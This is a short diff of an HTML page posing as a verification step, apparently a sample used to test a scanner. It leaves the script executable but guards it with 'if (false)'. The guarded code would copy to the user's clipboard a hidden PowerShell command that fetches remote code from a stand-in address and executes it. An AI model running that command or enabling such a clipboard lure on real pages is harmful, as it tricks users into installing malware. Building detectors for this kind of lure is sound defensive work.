@@ -36,11 +36,14 @@
     <p>Do not close this window while verification completes.</p>
 </div>
 
-<!-- Deliberately inert: type="text/plain" means the browser never runs this. -->
-<script type="text/plain" id="clickfix-code">
+<script>
+/* Deliberately inert: the "if (false)" guard means nothing is ever copied to
+   your clipboard. It is executable JavaScript so the scanner reads it as code. */
+if (false) {
     document.querySelector('.check').addEventListener('click', function () {
         navigator.clipboard.writeText('powershell -w hidden -c "iwr http://203.0.113.10/v.txt|iex" # verify-id-8842');
     });
+}
 </script>
 </body>
 </html>
